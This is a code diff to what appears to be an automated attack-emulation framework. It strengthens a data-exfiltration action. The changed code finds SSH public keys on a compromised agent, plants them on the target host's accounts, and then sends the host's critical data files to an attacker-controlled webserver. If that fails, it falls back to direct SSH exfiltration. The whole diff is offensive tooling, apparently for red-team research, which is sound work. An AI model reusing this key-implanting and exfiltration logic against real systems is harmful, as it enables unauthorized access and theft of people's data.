@@ -8,9 +8,10 @@ from incalmo.core.actions.LowLevel import (
     AddSSHKey,
     SCPFile,
     wgetFile,
+    ListFilesInDirectory,
 )
 from incalmo.core.models.network import Host
-from incalmo.core.models.events import Event, FileContentsFound
+from incalmo.core.models.events import Event, FileContentsFound, FilesFound
 from incalmo.core.services import (
     LowLevelActionOrchestrator,
     EnvironmentStateService,
@@ -60,7 +61,7 @@ class ExfiltrateData(HighLevelAction):
 
         if webserver_exists:
             # Exfiltrate data over http
-            await self.indirect_http_exfiltrate(
+            success = await self.indirect_http_exfiltrate(
                 attacker_agent,
                 self.target_host,
                 low_level_action_orchestrator,
@@ -68,6 +69,10 @@ class ExfiltrateData(HighLevelAction):
                 attack_graph_service,
                 context,
             )
+            if not success:
+                await self.direct_ssh_exfiltrate(
+                    attacker_agent, low_level_action_orchestrator, context
+                )
         else:
             await self.direct_ssh_exfiltrate(
                 attacker_agent, low_level_action_orchestrator, context
@@ -88,24 +93,47 @@ class ExfiltrateData(HighLevelAction):
         )
         return events
 
+    async def _get_ssh_public_key(
+        self,
+        agent: Agent,
+        low_level_action_orchestrator: LowLevelActionOrchestrator,
+        context: HighLevelContext,
+    ) -> str | None:
+        # Discover whatever .pub key exists rather than guessing the type
+        list_events = await low_level_action_orchestrator.run_action(
+            ListFilesInDirectory(agent, "~/.ssh"), context
+        )
+        pub_files = []
+        for event in list_events:
+            if isinstance(event, FilesFound):
+                pub_files = [f for f in event.files if f.endswith(".pub")]
+                break
+
+        for filename in pub_files:
+            events = await low_level_action_orchestrator.run_action(
+                ReadFile(agent, f"~/.ssh/{filename}"), context
+            )
+            for event in events:
+                if (
+                    isinstance(event, FileContentsFound)
+                    and event.contents
+                    and event.contents.startswith("ssh-")
+                ):
+                    return event.contents
+        return None
+
     async def direct_ssh_exfiltrate(
         self,
         attacker_agent: Agent,
         low_level_action_orchestrator: LowLevelActionOrchestrator,
         context: HighLevelContext,
     ):
-        # Get SSH key of attacker agent
-        events = await low_level_action_orchestrator.run_action(
-            ReadFile(attacker_agent, "/root/.ssh/id_rsa.pub"), context
+        ssh_key_data = await self._get_ssh_public_key(
+            attacker_agent, low_level_action_orchestrator, context
         )
-        ssh_key_data = None
-        for event in events:
-            if isinstance(event, FileContentsFound):
-                ssh_key_data = event.contents
-                break
 
-        if ssh_key_data is None:
-            raise Exception("No attacker ssh key")
+        if not ssh_key_data:
+            return
 
         for user, file_paths in self.target_host.critical_data_files.items():
             target_agent = self.target_host.get_agent_by_username(user)
@@ -151,7 +179,7 @@ class ExfiltrateData(HighLevelAction):
         env_state_service: EnvironmentStateService,
         attack_graph_service: AttackGraphService,
         context: HighLevelContext,
-    ):
+    ) -> bool:
         hosts_with_creds = attack_graph_service.find_hosts_with_credentials_to_host(
             target_host
         )
@@ -171,9 +199,11 @@ class ExfiltrateData(HighLevelAction):
         if webserver_host is None:
             raise Exception("No webservers to exfiltrate to")
 
-        await self.add_ssh_key(
+        key_added = await self.add_ssh_key(
             webserver_host, target_host, low_level_action_orchestrator, context
         )
+        if not key_added:
+            return False
 
         for user, critical_filepaths in self.target_host.critical_data_files.items():
             for critical_filepath in critical_filepaths:
@@ -207,8 +237,7 @@ class ExfiltrateData(HighLevelAction):
         webserver_port = webserver_host.get_port_for_service("http")
 
         if ssh_host_ip is None or webserver_port is None:
-            # Error, unable to exfitlrate data
-            return []
+            return False
 
         for user, critical_filepaths in self.target_host.critical_data_files.items():
             for critical_filepath in critical_filepaths:
@@ -220,6 +249,7 @@ class ExfiltrateData(HighLevelAction):
                     ),
                     context,
                 )
+        return True
 
     async def add_ssh_key(
         self,
@@ -227,23 +257,19 @@ class ExfiltrateData(HighLevelAction):
         target_host: Host,
         low_level_action_orchestrator: LowLevelActionOrchestrator,
         context: HighLevelContext,
-    ):
+    ) -> bool:
+        key_added = False
         for src_agent in source_host.agents:
-            # Get SSH key of attacker agent
-            events = await low_level_action_orchestrator.run_action(
-                ReadFile(src_agent, "~/.ssh/id_rsa.pub"), context
+            ssh_key_data = await self._get_ssh_public_key(
+                src_agent, low_level_action_orchestrator, context
             )
-            ssh_key_data = None
-            for event in events:
-                if isinstance(event, FileContentsFound):
-                    ssh_key_data = event.contents
-                    break
 
             if ssh_key_data is None:
                 continue
 
             for target_agent in target_host.agents:
-                # Add SSH key to target host
                 await low_level_action_orchestrator.run_action(
                     AddSSHKey(target_agent, ssh_key_data), context
                 )
+            key_added = True
+        return key_added
